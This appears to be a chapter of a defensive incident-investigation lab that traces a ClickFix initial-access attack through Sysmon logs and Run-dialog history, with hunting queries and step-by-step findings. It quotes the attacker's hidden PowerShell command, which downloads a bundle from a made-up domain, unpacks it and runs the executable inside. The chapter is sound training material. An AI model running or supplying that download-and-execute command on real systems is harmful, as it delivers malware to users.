---
title: "2. Initial access"
---

<p class="lb-kicker">Chapter 2 · Q003 to Q004</p>

# Initial access

<p class="lb-lede">Explorer started PowerShell directly, which users rarely do by clicking around. Windows keeps a history of what was typed into the Run dialog, and Sysmon logs it too.</p>

## What was typed into Run? <span class="q-ref">Q003</span> { #q003 }

When a user presses ++win+r++ and runs something, Explorer writes the command to the `RunMRU` registry key. Sysmon logs the write as event 13 (registry value set).

```bql
event_id="13" target_object=~"\\RunMRU\\" | target_object!=$"MRUList" | sort(timestamp) | table(timestamp, computer_name, image, details)
```
<!-- shot: q003-runmru | Everything typed into the Run dialog, oldest first. | rows=3 -->

There are three entries, all on WS02 and all written by Explorer. The first is at **14:02:27.543**, within milliseconds of the PowerShell process from chapter 1:

```text
powershell -w h -c "$t=$env:temp;iwr 'https://update-cache-m9tdco18phmc.com/a/.../pkg?...' -o $t\q;
  tar xf $t\q -C $t;saps $t\QuickConnect\QuickConnectSupport.exe"
```

That's a hidden download command pasted into the Run box. It's what a fake "verify you are human" or "fix this error" page does: it copies a command to the clipboard and tells the user to press ++win+r++, ++ctrl+v++, ++enter++. The `\1` at the end of each value is an MRU marker and isn't part of the command.

!!! finding "Finding · Q003"
    The technique is **ClickFix** (ATT&CK [T1204.004](https://attack.mitre.org/techniques/T1204/004/), Malicious Copy and Paste).

<!-- figure: labs/001/figures/clickfix.html | How ClickFix works, and what each step leaves in the logs. -->

The other two entries, at 14:22 and 14:51, come later. [Chapter 4](04-hands-on-keyboard.md) covers them.

## What did it download? <span class="q-ref">Q004</span> { #q004 }

Here's the command piece by piece:

| Part | Does |
|---|---|
| `powershell -w h` | Runs PowerShell with a hidden window |
| `iwr '...' -o $t\q` | `Invoke-WebRequest`: downloads `.../pkg` and saves it as `%TEMP%\q` |
| `tar xf $t\q -C $t` | Unpacks it with the built-in `tar.exe` |
| `saps $t\QuickConnect\QuickConnectSupport.exe` | `Start-Process`: runs what was unpacked |

Sysmon logged PowerShell looking up the download domain:

```bql
bifract_category="dns_query" query=~update-cache | groupBy(computer_name, image, query, function=min(timestamp))
```
<!-- shot: q004-dns | PowerShell looks up the download domain. | rows=4 -->

The lookup is logged at 14:02:26.545, about a second before the process start event for the same PowerShell. Sysmon timestamps for different event types can be off by that much, so don't read too much into ordering under a second or two.

!!! finding "Finding · Q004"
    Explorer launched **powershell.exe**, which downloaded and unpacked the first bundle from `update-cache-m9tdco18phmc.com`.

!!! warning "Don't visit"
    `update-cache-m9tdco18phmc.com` is a made-up domain. Don't resolve or browse to it.

Next: [what came out of that bundle](03-loader.md).
